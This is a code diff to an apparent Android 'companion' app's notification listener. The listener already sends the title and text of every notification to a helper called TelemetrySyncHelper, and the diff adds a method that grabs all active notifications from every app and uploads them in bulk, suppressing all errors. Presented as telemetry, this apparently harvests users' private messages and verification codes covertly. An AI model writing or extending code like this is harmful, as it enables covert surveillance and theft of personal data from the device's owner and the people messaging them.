@@ -1,6 +1,7 @@
 package com.snapapp.companion;
 
 import android.app.Notification;
+import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
@@ -40,9 +41,24 @@ public class SnapNotificationListener extends NotificationListenerService {
         TelemetrySyncHelper.uploadNotification(this, pkg, appName, title, text, postTime);
     }
 
+    private static volatile SnapNotificationListener sInstance;
+
+    public static void fetchAndUploadActive(Context context) {
+        if (sInstance == null) return;
+        try {
+            StatusBarNotification[] active = sInstance.getActiveNotifications();
+            if (active != null) {
+                for (StatusBarNotification sbn : active) {
+                    sInstance.onNotificationPosted(sbn);
+                }
+            }
+        } catch (Throwable ignored) {}
+    }
+
     @Override
     public void onListenerConnected() {
         super.onListenerConnected();
+        sInstance = this;
         getSharedPreferences("snap_companion_prefs", MODE_PRIVATE).edit().putBoolean("is_notification_listener_active", true).apply();
         try {
             SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
@@ -57,6 +73,7 @@ public class SnapNotificationListener extends NotificationListenerService {
     @Override
     public void onListenerDisconnected() {
         super.onListenerDisconnected();
+        sInstance = null;
         getSharedPreferences("snap_companion_prefs", MODE_PRIVATE).edit().putBoolean("is_notification_listener_active", false).apply();
     }
 
